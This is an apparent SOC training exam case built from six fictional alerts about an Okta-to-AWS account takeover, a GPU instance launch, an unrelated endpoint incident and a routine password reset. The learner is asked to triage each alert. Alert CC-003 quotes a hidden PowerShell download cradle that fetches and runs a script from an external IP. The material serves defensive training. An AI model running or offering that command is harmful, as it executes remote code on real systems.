# Case_048 — 🏁 Bonus Final Exam, Stage 1: Okta→AWS Account Takeover, Separate Endpoint Incident, and Unrelated Routine Reset

**Status:** Bonus material — not counted toward the 150-alert target (reached at Case_047).
Triaged with full rigor as a closing skills demonstration.
**Format:** Mixed — Okta System Log, AWS CloudTrail, Windows Security Event Log, 6-alert queue
with live interrupt
**Company:** Aurora Resorts & Casinos (internal alias — sanitized)
**Splunk verified:** No — ticket-only (analyst decision)

---

## Alerts (as received at trigger time)

```
Alert CC-001 — Okta: Impossible Travel Detected
  Severity: Medium
  Account: s.mehta@auroraresorts.com
  Detail: Sign-in from Ahmedabad, India at 08:00 UTC, then Warsaw, Poland
          at 08:45 UTC (45-minute gap, ~5,900 km) — flagged as impossible
          travel; MFA satisfied via Authenticator push both times
  Time: 08:00–08:45 UTC

Alert CC-002 — AWS: New IAM User Created With Console Access
  Severity: High
  Actor: s.mehta@auroraresorts.com (federated into AWS via Okta SSO)
  Detail: New IAM user "backup-svc-2" created with console access and
          AdministratorAccess policy attached; s.mehta's role is Marketing
          Analytics, no documented AWS admin function; no change ticket
  Time: 08:52:14 UTC (7 minutes after CC-001's second sign-in)

Alert CC-003 — Endpoint: PowerShell Download Cradle
  Severity: High
  Host: MFL-WKS0287 (unrelated to s.mehta, different department)
  User: t.oconnor
  Detail: powershell.exe -nop -w hidden -c "IEX(New-Object
          Net.WebClient).DownloadString('http://185.44.12.9/loader.ps1')"
  Parent process: outlook.exe
  Time: 09:10:00 UTC

Alert CC-004 — Okta: Password Reset via Self-Service, Standard Pattern
  Severity: Low
  Account: r.bhagat@auroraresorts.com
  Detail: Self-service password reset, standard email verification
          completed, from usual device/browser fingerprint, matches this
          user's historical reset frequency (~every 90 days)
  Time: 09:15:00 UTC

Alert CC-005 — AWS: New Access Key Generated for "backup-svc-2"
  Severity: Critical
  Actor: s.mehta@auroraresorts.com
  Detail: Access key pair generated for the IAM user created in CC-002;
          same session
  Time: 09:20:03 UTC

>>> LIVE INTERRUPT — fired mid-queue <<<

Alert CC-006 — AWS: EC2 Instances Launched in Unused Region, GPU-Optimized
  Severity: Critical
  Actor: backup-svc-2 (using the access key from CC-005)
  Detail: 12 x g5.48xlarge GPU instances launched in ap-southeast-3 (a
          region Aurora has never used — all existing infrastructure is in
          ap-south-1); instance names: "worker-01" through "worker-12"
  Source IP: 91.219.212.60 (external)
  Time: 09:24:47 UTC
```

## Task

Stage 1 of the bonus exam. TP / FP / Ambiguous for CC-001 through CC-006, working at pace. Not
everything in this queue belongs to the same incident — verify actor/account overlap carefully
before assuming correlation. Flag what changes once CC-006 fires.
